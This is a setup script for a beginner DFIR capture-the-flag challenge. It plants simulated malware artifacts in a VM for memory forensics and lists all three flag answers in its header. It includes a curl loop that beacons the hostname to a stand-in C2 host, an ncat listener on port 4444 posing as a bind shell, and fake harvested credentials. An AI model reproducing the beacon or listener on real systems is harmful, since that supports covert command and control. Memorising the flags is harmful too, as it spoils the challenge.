#!/bin/sh
#
# simulate_attack.sh — Run inside an Alpine Linux VM to plant forensic artifacts
# Part of Romeo DFIR Challenge: "Patient Zero" (Easy tier)
#
# This script creates realistic attack artifacts that will persist in memory
# when captured with AVML. Run this script, then IMMEDIATELY capture memory.
#
# FLAGS:
#   FLAG1: susp1c10us_pr0c3ss_f0und  (in process command-line args)
#   FLAG2: p0w3rsh3ll_d3c0d3d        (base64-encoded in a script loaded in memory)
#   FLAG3: m4cr0_c2_c4llb4ck         (in a curl command URL)
#
# USAGE:
#   1. Copy this script to the Alpine VM
#   2. Run as root: sh simulate_attack.sh
#   3. Wait 5 seconds for all processes to start
#   4. Capture memory: sudo ./avml memdump.raw
#   5. Compress: gzip -9 memdump.raw
#   6. Copy memdump.raw.gz to the host
#
# PREREQUISITES (install in Alpine VM):
#   apk add python3 curl bash ncat-nmap procps
#

set -e

echo "[*] Operation Midnight Raven — Patient Zero Attack Simulation"
echo "[*] Planting forensic artifacts for memory capture..."
echo ""

# ── FLAG 1: Suspicious process with flag in command-line args ────────────────
# Simulates malware running from /tmp/ — a classic indicator of compromise.
# The flag appears in the process arguments visible via /proc/PID/cmdline.

echo "[+] FLAG1: Starting suspicious process from /tmp/..."

# Create a fake malware binary (just sleeps forever)
cat > /tmp/svchost << 'MALWARE'
#!/bin/sh
# Fake malware - just stays resident in memory
while true; do sleep 3600; done
MALWARE
chmod +x /tmp/svchost

# Run it with the flag in the command-line arguments
# Players find this via: strings memdump.raw | grep -i "susp1c10us"
# Or via: vol3 linux.psaux (shows full command lines)
/tmp/svchost -config susp1c10us_pr0c3ss_f0und -beacon 30 -retry &
FLAG1_PID=$!
echo "    PID: $FLAG1_PID"
echo "    Path: /tmp/svchost -config susp1c10us_pr0c3ss_f0und -beacon 30 -retry"

# ── FLAG 2: Base64-encoded payload in a running script ───────────────────────
# Simulates an encoded PowerShell/Python reverse shell. Players must find the
# base64 string and decode it.
# echo "cDB3M3JzaDNsbF9kM2MwZDNk" | base64 -d  →  p0w3rsh3ll_d3c0d3d

echo "[+] FLAG2: Starting encoded reverse shell script..."

cat > /tmp/.hidden_shell.py << 'REVSHELL'
#!/usr/bin/env python3
"""
EverSec Network Monitor v2.1 — Internal Use Only
Encoded configuration for security: cDB3M3JzaDNsbF9kM2MwZDNk
This string is a base64-encoded configuration token.
Decode with: echo cDB3M3JzaDNsbF9kM2MwZDNk | base64 -d
"""
import time
import socket
import os

# Encoded payload — appears in memory when this script is running
ENCODED_CONFIG = "cDB3M3JzaDNsbF9kM2MwZDNk"

def beacon():
    """Simulate C2 beacon check-in"""
    while True:
        try:
            # Just sleep — we want the script resident in memory
            # The ENCODED_CONFIG string will appear in the process memory
            time.sleep(3600)
        except Exception:
            time.sleep(60)

if __name__ == "__main__":
    beacon()
REVSHELL
chmod +x /tmp/.hidden_shell.py

python3 /tmp/.hidden_shell.py &
FLAG2_PID=$!
echo "    PID: $FLAG2_PID"
echo "    Encoded: cDB3M3JzaDNsbF9kM2MwZDNk (base64 → p0w3rsh3ll_d3c0d3d)"

# ── FLAG 3: C2 callback URL with flag as token ──────────────────────────────
# Simulates a malware callback script. The flag is in the URL as a query param.
# Players find via: strings memdump.raw | grep "token="

echo "[+] FLAG3: Starting C2 callback script..."

cat > /tmp/.update_check.sh << 'C2SCRIPT'
#!/bin/sh
# EverSec Auto-Update Service — checks for system updates
# Internal configuration — do not modify

C2_SERVER="https://update.eversec-cdn.com/check"
CALLBACK_URL="${C2_SERVER}?host=$(hostname)&token=m4cr0_c2_c4llb4ck&interval=300"

while true; do
    # Attempt callback (will fail — no real server, but URL stays in memory)
    curl -s -o /dev/null --connect-timeout 2 "$CALLBACK_URL" 2>/dev/null || true
    sleep 300
done
C2SCRIPT
chmod +x /tmp/.update_check.sh

sh /tmp/.update_check.sh &
FLAG3_PID=$!
echo "    PID: $FLAG3_PID"
echo "    URL contains: token=m4cr0_c2_c4llb4ck"

# ── Additional realism: network activity ─────────────────────────────────────
echo "[+] Starting background network listeners for realism..."

# Netcat listener on unusual port (simulates bind shell)
if command -v ncat >/dev/null 2>&1; then
    ncat -l -k 4444 &
    echo "    Netcat listener on port 4444 (PID: $!)"
elif command -v nc >/dev/null 2>&1; then
    nc -l -k -p 4444 &
    echo "    Netcat listener on port 4444 (PID: $!)"
fi

# ── Additional realism: suspicious files ─────────────────────────────────────
echo "[+] Creating suspicious files for additional realism..."

# Fake credential harvest
cat > /tmp/.credentials.txt << 'CREDS'
# Harvested credentials — 2026-03-15
admin:EverSec2026!
d.kim:DevOps2026!Spring
svc_deploy:cr3d3nt14l_dump_4n4lyz3d
j.park:Finance!Q1-2026
CREDS

# Fake SSH key
mkdir -p /tmp/.ssh_staging
cat > /tmp/.ssh_staging/id_rsa << 'SSHKEY'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBr4GKHRa8K1JKw9EPn8FakeKeyForCTFChallenge==
-----END OPENSSH PRIVATE KEY-----
SSHKEY

echo ""
echo "============================================================"
echo "[*] All artifacts planted. Process summary:"
echo "    FLAG1 process: PID $FLAG1_PID (/tmp/svchost)"
echo "    FLAG2 process: PID $FLAG2_PID (python3 /tmp/.hidden_shell.py)"
echo "    FLAG3 process: PID $FLAG3_PID (sh /tmp/.update_check.sh)"
echo ""
echo "[*] NOW CAPTURE MEMORY IMMEDIATELY:"
echo "    sudo ./avml memdump.raw"
echo "    gzip -9 memdump.raw"
echo ""
echo "[*] Verification (run on the compressed dump):"
echo "    zcat memdump.raw.gz | strings | grep 'susp1c10us_pr0c3ss'"
echo "    zcat memdump.raw.gz | strings | grep 'cDB3M3JzaDNsbF9kM2MwZDNk'"
echo "    zcat memdump.raw.gz | strings | grep 'token=m4cr0_c2'"
echo "============================================================"

# Keep script running so all child processes stay alive
echo "[*] Press Ctrl+C AFTER capturing memory to stop all processes."
wait
